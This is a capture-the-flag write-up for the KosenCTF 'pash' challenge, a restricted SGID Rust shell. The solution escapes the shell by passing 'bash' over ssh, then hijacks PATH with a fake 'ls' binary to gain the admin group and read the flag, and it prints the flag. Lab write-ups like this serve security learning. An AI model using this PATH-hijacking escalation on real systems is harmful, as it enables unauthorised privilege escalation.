# pash
- Category: misc pwn
- Score: 373pts
- Solves: 12 solves
- Author: ptr-yudai

> ssh pwn@pwn.kosenctf.com -p9022
> password: guest


## Description

```
Last login: Sun Sep  6 14:28:45 2020 from xxxxxxxxxxxxx
***** PASH - Partial Admin SHell *****
  __      _  ,---------------------.  
o'')}____// <' Only few commands   |  
 `_/      )  |      are available. |  
 (_(_/-(_/   '---------------------'  

(admin)$ ls
total 424K
dr-xr-x--- 1 root pwn   4.0K Sep  3 16:04 .
drwxr-xr-x 1 root root  4.0K Sep  3 16:04 ..
-rw-r--r-- 1 root pwn     61 Sep  3 16:04 .bash_profile
-r--r----- 1 root admin   49 Sep  3 14:49 flag.txt
-r-xr-sr-x 1 root admin 403K Sep  3 14:49 pash
-rw-rw-r-- 1 root pwn   2.4K Sep  3 14:49 pash.rs
(admin)$ cat pash.rs
use std::collections::HashMap;
use std::io::{self, Write};
use std::process::Command;

fn cmd_whoami(_args: &mut std::str::SplitWhitespace) {
    let mut child = Command::new("whoami")
        .spawn()
        .expect("Failed to execute process");
    child.wait().expect("Failed to wait on child");
}
fn cmd_ls(_args: &mut std::str::SplitWhitespace) {
    let mut child = Command::new("ls")
        .arg("-lha")
        .spawn()
        .expect("Failed to execute process");
    child.wait().expect("Failed to wait on child");
}
fn cmd_pwd(_args: &mut std::str::SplitWhitespace) {
    let mut child = Command::new("pwd")
        .spawn()
        .expect("Failed to execute process");
    child.wait().expect("Failed to wait on child");
}
fn cmd_cat(args: &mut std::str::SplitWhitespace) {
    let path;
    match args.next() {
        None => path = "-",
        Some(arg) => path = arg
    }
    if path.contains("flag.txt") {
        println!("ฅ^•ﻌ•^ฅ < RESTRICTED!");
        return;
    }
    let mut child = Command::new("cat")
        .arg(path)
        .spawn()
        .expect("Failed to execute process");
    child.wait().expect("Failed to wait on child");
}
fn cmd_exit(_args: &mut std::str::SplitWhitespace) {
    std::process::exit(0);
}

fn main() {
    let mut f = HashMap::<String, &dyn Fn(&mut std::str::SplitWhitespace)->()>::new();
    /* set available commands */
    f.insert("whoami".to_string(), &cmd_whoami);
    f.insert("ls".to_string(), &cmd_ls);
    f.insert("pwd".to_string(), &cmd_pwd);
    f.insert("cat".to_string(), &cmd_cat);
    f.insert("exit".to_string(), &cmd_exit);

    println!("***** PASH - Partial Admin SHell *****");
    println!("  __      _  ,---------------------.  ");
    println!("o'')}}____// <' Only few commands   |  ");
    println!(" `_/      )  |      are available. |  ");
    println!(" (_(_/-(_/   '---------------------'  \n");

    loop {
        /* read input */
        print!("(admin)$ ");
        io::stdout().flush().unwrap();
        let mut s = String::new();
        io::stdin().read_line(&mut s).ok();

        /* execute command */
        let mut args = s.trim().split_whitespace();
        let cmd = args.next().unwrap();
        if f.contains_key(cmd) {
            (f.get(cmd).unwrap() as &dyn Fn(&mut std::str::SplitWhitespace)->())(&mut args);
        } else {
            println!("No such command: {}", cmd);
        }
    }
}
```

So we can't directly cat `flag.txt` huh...


## Solution

After some investigation, I found that we can do Port Forwarding, SCP to the box, and my teammates can get a normal `bash` shell from the server.

```bash
# port forwarding
ssh -L 3211:127.0.0.1:22 pwn@pwn.kosenctf.com -p9022

# get bash
ssh -t pwn@pwn.kosenctf.com -p9022 "bash"
```

We can get a normal bash shell with this command as the chal setup `pash` shell using `.bash_profile`.

However, I still can't read the `flag.txt` as the account `pwn` does not have the permission.

```
-r--r----- 1 root admin   49 Sep  3 14:49 flag.txt
-r-xr-sr-x 1 root admin 403K Sep  3 14:49 pash
```

The `pash` executable have the `sgid` set tho... but from the source code it does not read the `flag.txt` at all...

Wait, maybe I can replace `ls` executable and make pash call it?

Here is the solution

```bash
mkdir -p /tmp/some_very_random_value # apparently they limit ppl from copying solutions by setting the perms
cd /tmp/some_very_random_value

# Randomly get a read file c program online: https://www.programmingsimplified.com/c-program-read-file
# Compile the file and send it to /tmp/some_very_random_value/ls

# LOCAL:  gcc -o a.out tmp.c
# LOCAL:  base64 -w 0 a.out

echo "<file_content>" | base64 -d > ls
chmod +x ls

export PATH=/tmp/some_very_random_value:$PATH

/home/pwn/pash # call the program and run ls

# you can press ctrl-z after calling `ls` in pash, so you can see the sgid permission sent to our process
pwn@f2b8f62b41d2:/tmp/some_very_random_value$ ps -o pid,euid,ruid,suid,egid,rgid,sgid,cmd
  PID  EUID  RUID  SUID  EGID  RGID  SGID CMD
10579  1000  1000  1000  1000  1000  1000 bash
10617  1000  1000  1000   999  1000   999 /home/pwn/pash
10618  1000  1000  1000   999  1000   999 ls -lha
10619  1000  1000  1000  1000  1000  1000 ps -o pid,euid,ruid,suid

```

The flag is: `KosenCTF{d1d_u_n0t1c3_th3r3_3x1sts_2_s0lut10ns?}`

I didn't come up with another solution so lets me read writeups...
